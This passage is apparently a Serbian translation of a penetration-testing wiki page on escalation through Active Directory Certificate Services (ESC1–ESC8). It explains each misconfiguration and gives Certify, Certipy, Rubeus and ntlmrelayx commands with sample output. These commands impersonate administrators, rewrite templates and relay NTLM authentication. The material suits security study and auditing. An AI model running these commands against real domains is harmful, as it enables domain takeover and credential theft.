# AD CS eskalacija domena

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz sledećih tekstova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani predlošci sertifikata - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih predložaka sertifikata - ESC1

- **Enterprise CA dodeljuje prava za registraciju korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Bezbednosni deskriptori na predlošcima sertifikata su previše permisivni, što korisnicima sa niskim privilegijama omogućava da dobiju prava za registraciju.**
- **Predlošci sertifikata su konfigurisani tako da definišu EKU-ove koji olakšavaju autentifikaciju:**
- Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili bez EKU-a (SubCA).
- **Predložak dozvoljava podnosiocima zahteva da u Certificate Signing Request (CSR) uključe subjectAltName:**
- Active Directory (AD) daje prednost vrednosti subjectAltName (SAN) u sertifikatu prilikom verifikacije identiteta, ako je prisutna. To znači da se navođenjem SAN-a u CSR-u može zatražiti sertifikat za impersonaciju bilo kog korisnika (npr. administratora domena). Da li podnosilac zahteva može da navede SAN određuje se u AD objektu predloška sertifikata, kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo zastavice `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućava podnosiocu zahteva da navede SAN.

> [!CAUTION]
> Opisana konfiguracija omogućava korisnicima sa niskim privilegijama da zatraže sertifikate sa proizvoljnim SAN-om, čime se omogućava autentifikacija kao bilo koji principal domena putem Kerberos-a ili SChannel-a.

Ova funkcija je ponekad omogućena radi podrške dinamičkom generisanju HTTPS ili host sertifikata koje obavljaju proizvodi ili deployment servisi, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći predložak sertifikata (kao što je predložak `WebServer`, koji ima omogućenu opciju `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira i zatim izmeni tako da uključuje OID za autentifikaciju.<sup>[[6]](#references)</sup>

### Abuse

Da biste **pronašli ranjive predloške sertifikata**, možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se **zloupotrebila ova ranjivost za lažno predstavljanje administratora**, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete konvertovati generisani **sertifikat u `.pfx`** format i ponovo ga koristiti za **autentifikaciju pomoću Rubeus ili certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija certificate templates unutar configuration schema AD Forest-a, konkretno onih koji ne zahtevaju approval ili signatures, poseduju Client Authentication ili Smart Card Logon EKU i imaju omogućenu `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zastavicu, može se izvršiti pokretanjem sledećeg LDAP query-ja:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani Certificate Templates - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za enrollment korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje od strane menadžera je onemogućen.
3. Zahtev za autorizovanim potpisima je izostavljen.
4. Previše permisivan security descriptor na certificate template-u dodeljuje korisnicima sa niskim privilegijama prava za enrollment sertifikata.
5. **Certificate template je definisan tako da uključuje Any Purpose EKU ili da nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju namenu**, uključujući client authentication, server authentication, code signing itd. Ista **tehnika koja se koristi za ESC3** može se primeniti za iskorišćavanje ovog scenarija.

Sertifikati **bez EKU-ova**, koji funkcionišu kao subordinate CA sertifikati, mogu se iskoristiti za **bilo koju namenu** i **takođe koristiti za potpisivanje novih sertifikata**. Zbog toga bi napadač mogao da navede proizvoljne EKU-ove ili polja u novim sertifikatima koristeći subordinate CA sertifikat.

Međutim, novi sertifikati kreirani za **domain authentication** neće funkcionisati ako subordinate CA nije pouzdan za objekat **`NTAuthCertificates`**, što je podrazumevano podešavanje. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi potencijalno mogli biti **zloupotrebljeni** u različite svrhe (npr. code signing, server authentication itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Za enumeraciju template-a koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se izvršiti sledeći LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrolment Agent Templates - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita template-a** (zbog toga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principalu da se **enrolluje** za **certificate** **u ime drugog korisnika**.

**„enrollment agent“** se **enrolluje** u takav **template** i koristi dobijeni **certificate da potpiše CSR u ime drugog korisnika**. Zatim **šalje** **zajednički potpisan CSR** CA-u, pri čemu se enrolluje u **template** koji **dozvoljava „enroll on behalf of“**, a CA odgovara **certificate-om koji pripada „drugom“ korisniku**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrolment korisnicima sa niskim privilegijama.
- Zahtev za odobrenje menadžera je izostavljen.
- Ne postoji zahtev za autorizovanim potpisima.
- Security descriptor certificate template-a je previše permisivan i dodeljuje prava za enrolment korisnicima sa niskim privilegijama.
- Certificate template uključuje Certificate Request Agent EKU, omogućavajući zahtevanje drugih certificate template-a u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrolment korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Verzija šeme template-a je ili 1 ili veća od 2, a template navodi Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u dozvoljava domain authentication.
- Ograničenja za enrollment agents nisu primenjena na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za zloupotrebu ovog scenarija:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Korisnici** kojima je dozvoljeno da **dobiju** **enrollment agent certificate**, šabloni u kojima je enrollment **agentima** dozvoljeno da izvrše enrollment i **nalozi** u čije ime enrollment agent može da postupa mogu biti ograničeni enterprise CA-ovima. To se postiže otvaranjem `certsrc.msc` **snap-in**-a, **desnim klikom na CA**, **klikom na Properties**, a zatim **odlaskom** na karticu “Enrollment Agents”.

Međutim, treba napomenuti da je **podrazumevana** postavka za CA-ove “**Do not restrict enrollment agents**.” Kada administratori omoguće ograničenje enrollment agenata, podešavanjem opcije “Restrict enrollment agents”, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava grupi **Everyone** da izvrši enrollment u svim šablonima u ime bilo koga.

## Vulnerable Certificate Template Access Control - ESC4

### **Objašnjenje**

**Security descriptor** na **certificate templates** definiše konkretne **permissions** koje određeni **AD principals** imaju u vezi sa šablonom.

Ako **attacker** poseduje potrebne **permissions** za **izmenu** **šablona** i **uvođenje** bilo kojih **exploitable misconfigurations** opisanih u **prethodnim odeljcima**, to može omogućiti privilege escalation.

Značajne permissions koje se primenjuju na certificate templates uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Daje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kog atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kog atributa.
- **WriteOwner:** Omogućava izmenu vlasnika objekta u principal-a pod kontrolom attackera.
- **WriteDacl:** Omogućava izmenu access control-a, što potencijalno može attackeru dodeliti FullControl.
- **WriteProperty:** Omogućava izmenu bilo kog svojstva objekta.

### Abuse

Da biste identifikovali principale sa pravima izmene šablona i drugih PKI objekata, izvršite enumeraciju pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a kao u prethodnom slučaju:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je slučaj kada korisnik ima prava pisanja nad certificate template-om. Ovo se, na primer, može zloupotrebiti za prepisivanje konfiguracije certificate template-a i učiniti template ranjivim na ESC1.

Kao što možemo videti na putanji iznad, samo `JOHNPC` ima ova prava, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` edge vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog pregleda Certipy-jeve `shadow auto` komande za preuzimanje NT hash-a žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može prepisati konfiguraciju certificate template-a jednom komandom. **Podrazumevano**, Certipy će **prepisati** konfiguraciju tako da postane **ranjiva na ESC1**. Takođe možemo navesti **`-save-old` parameter za čuvanje stare konfiguracije**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

Široka mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored certificate templates i certificate authority, može uticati na bezbednost celokupnog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD computer object CA servera, koji može biti kompromitovan mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji potomak AD objekta ili container unutar određene putanje containera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, containere i objekte kao što su Certificate Templates container, Certification Authorities container, NTAuthCertificates object i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Tema obrađena u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se dotiče implikacija **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag-a, kako ih je opisao Microsoft. Kada je ova konfiguracija aktivirana na Certification Authority (CA), ona dozvoljava uključivanje **vrednosti koje definiše korisnik** u **subject alternative name** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®. Posledično, ova mogućnost omogućava **napadaču** da se enroll-uje kroz **bilo koji template** podešen za domain **authentication** — naročito kroz one koji omogućavaju enrollment **neprivilegovanim** korisnicima, kao što je standardni User template. Na taj način moguće je dobiti certificate koji napadaču omogućava da se autentifikuje kao domain administrator ili **bilo koji drugi aktivni entitet** unutar domena.<sup>[[9]](#references)</sup>

**Napomena**: Pristup dodavanja **alternative names** u Certificate Signing Request (CSR), pomoću argumenta `-attrib "SAN:"` u `certreq.exe` (koji se naziva „Name Value Pairs“), razlikuje se od strategije eksploatacije SAN-ova u ESC1. Razlika je u tome **kako su informacije o nalogu enkapsulirane** — unutar certificate attribute-a, a ne extension-a.

### Abuse

Da bi proverile da li je podešavanje aktivirano, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **remote registry access**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i iskoriste je:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Za izmenu ovih podešavanja, pod pretpostavkom da posedujete **administratorska prava domena** ili ekvivalentna prava, sledeća komanda može da se izvrši sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavica se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novokreirani **sertifikati** sadržavaće **security ekstenziju** koja uključuje svojstvo **`objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odgovara vrednosti **`objectSid` podnosioca zahteva**, a ne SAN-u.\
> Za iskorišćavanje ESC6 neophodno je da sistem bude podložan tehnici ESC10 (Weak Certificate Mappings), koja daje prednost **SAN-u u odnosu na novu security ekstenziju**.

## Kontrola pristupa ranjivom Certificate Authority-ju - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za Certificate Authority održava se skupom dozvola koje uređuju radnje CA-a. Ove dozvole mogu se pregledati pristupom konzoli `certsrv.msc`, klikom desnim tasterom miša na CA, izborom opcije Properties, a zatim otvaranjem kartice Security. Pored toga, dozvole se mogu enumerisati pomoću modula PSPKI, korišćenjem komandi kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama “CA administrator” i “Certificate Manager”.<sup>[[6]](#references)</sup>

#### Abuse

Posedovanje prava **`ManageCA`** nad certificate authority omogućava principalu da daljinski manipuliše podešavanjima koristeći PSPKI. To uključuje uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se omogućilo navođenje SAN-a u bilo kom template-u, što predstavlja ključni aspekt domain escalation-a.

Ovaj proces se može pojednostaviti korišćenjem PSPKI cmdlet-a **Enable-PolicyModuleFlag**, koji omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva na čekanju, čime se efektivno zaobilazi zaštita "CA certificate manager approval".

Kombinacija modula **Certify** i **PSPKI** može se koristiti za podnošenje zahteva, odobravanje i preuzimanje certificate-a:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** korišćene su dozvole **`Manage CA`** za **omogućavanje** zastavice **EDITF_ATTRIBUTESUBJECTALTNAME2**, kako bi se izvršio **ESC6 attack**, ali ovo neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa **`Manage CA`**, korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može da restartuje servis udaljeno**. Pored toga, E**SC6 možda neće raditi bez dodatne konfiguracije** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zbog toga je ovde predstavljen drugi napad.

Preduslovi:

- Samo **`ManageCA` permission**
- **`Manage Certificates`** permission (može se dodeliti iz **`ManageCA`**)
- Certificate template **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa `Manage CA` _i_ `Manage Certificates` mogu **izdavati neuspešne zahteve za sertifikate**. Certificate template **`SubCA`** je **vulnerable to ESC1**, ali samo **administratori** mogu da se upišu u template. Dakle, **user** može da **zatraži** upis u **`SubCA`** - što će biti **odbijeno** - ali će ga **menadžer naknadno izdati**.<sup>[[6]](#references)</sup>

#### Abuse

Možete sebi **dodeliti pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Šablon **`SubCA`** može biti **omogućen na CA-u** pomoću parametra `-enable-template`. Podrazumevano je šablon `SubCA` omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi tako što ćemo **zatražiti sertifikat na osnovu `SubCA` template-a**.

**Ovaj zahtev će biti odbije**n**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Pomoću opcija **`Manage CA` i `Manage Certificates`**, možemo zatim **izdati neuspešan zahtev za sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I konačno, možemo **preuzeti izdati sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Napad 3 – Zloupotreba ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje zahteva na čekanju), **Certify 2.0** je otkrio potpuno novi primitiv koji zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metoda `ICertAdmin::SetExtension` može da se izvrši sa bilo kojim principalom koji poseduje *Manage Certificates*. Iako su legitimni CA sistemi ovu metodu tradicionalno koristili za ažuriranje ekstenzija na zahtevima **na čekanju**, napadač može da je zloupotrebi kako bi **dodao *nestandardnu* ekstenziju sertifikata** (na primer prilagođeni *Certificate Issuance Policy* OID kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA neće prepisati vrednost koju kontroliše napadač kada zahtev bude izdat. Dobijeni sertifikat zato sadrži ekstenziju koju je izabrao napadač, a koja može:

* Ispuniti zahteve Application / Issuance Policy drugih ranjivih template-a (što dovodi do privilege escalation).
* Ubaciti dodatne EKU-ove ili politike koje sertifikatu daju neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – koji se ranije smatrao „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu privilege escalation ili dugoročnu persistence, bez menjanja konfiguracije CA-a i bez potrebe za restriktivnijom pravom *Manage CA*.

#### Zloupotreba primitiva pomoću Certify 2.0

1. **Pošaljite zahtev za sertifikat koji će ostati *na čekanju*.** Ovo se može postići pomoću template-a koji zahteva odobrenje menadžera:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte prilagođenu ekstenziju zahtevu na čekanju** pomoću nove komande `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, navedena vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe poseduje prava za odobravanje *Manage Certificates*) ili sačekajte da ga operator odobri. Nakon izdavanja, preuzmite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Dobijeni sertifikat sada sadrži zlonamerni issuance-policy OID i može da se koristi u naknadnim napadima (npr. ESC13, domain escalation itd.).

> NAPOMENA: Isti napad može da se izvrši pomoću Certipy ≥ 4.7 kroz komandu `ca` i parametar `-set-extension`.

## NTLM Relay ka AD CS HTTP Endpoint-ima – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **AD CS instaliran**, ako postoji **ranjivi web enrollment endpoint** i objavljen je najmanje jedan **certificate template** koji dozvoljava **domain computer enrollment i client authentication** (kao što je podrazumevani **`Machine`** template), **napadač može da kompromituje bilo koji računar na kojem je aktivna spooler service**!

AD CS podržava nekoliko **HTTP-based enrollment metoda**, koje su dostupne kroz dodatne server roles koje administratori mogu da instaliraju. Ovi interfejsi za HTTP-based certificate enrollment podložni su **NTLM relay napadima**. Napadač sa **kompromitovanog računara može da se predstavlja kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM-a**. Dok se predstavlja kao nalog žrtve, napadač može da pristupi ovim web interfejsima i **zatraži client authentication sertifikat pomoću `User` ili `Machine` certificate template-a**.

- **Web enrollment interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, što ne pruža zaštitu od NTLM relay napada. Pored toga, eksplicitno dozvoljava samo NTLM authentication kroz Authorization HTTP header, zbog čega sigurnije metode autentifikacije, kao što je Kerberos, nisu primenljive.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate authentication preko Authorization HTTP header-a. Negotiate authentication podržava i **Kerberos** i **NTLM**, što napadaču omogućava da tokom relay napada **spusti autentifikaciju na NTLM**. Iako ovi web servisi podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita HTTPS servisa od NTLM relay napada moguća je samo kada se HTTPS koristi zajedno sa channel binding-om. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je neophodno za channel binding.<sup>[[6]](#references)</sup>

Uobičajeni **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sesija** i nemogućnost napadača da komunicira sa servisima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM relay napada za pribavljanje sertifikata za korisnika, jer period važenja sertifikata određuje trajanje sesije, a sertifikat može da se koristi sa servisima koji **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog sertifikata potražite ovde:


{{#ref}}
account-persistence.md
{{#endref}}

Još jedno ograničenje NTLM relay napada jeste to što **računar pod kontrolom napadača mora da bude autentifikovan od strane naloga žrtve**. Napadač može ili da čeka ili da pokuša da **iznudi** ovu autentifikaciju:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)`s `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CAs) za čuvanje Certificate Enrollment Service (CES) endpointa. Ovi endpointi mogu se parsirati i izlistati korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba pomoću [Certipy](https://github.com/ly4k/Certipy)

Zahtev za sertifikat Certipy podrazumevano podnosi na osnovu template-a `Machine` ili `User`, u zavisnosti od toga da li se naziv naloga koji se prosleđuje završava znakom `$`. Specifikacija alternativnog template-a može se izvršiti korišćenjem parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) može se zatim koristiti za iznuđivanje autentikacije. Kada se radi sa domain controller-ima, neophodno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
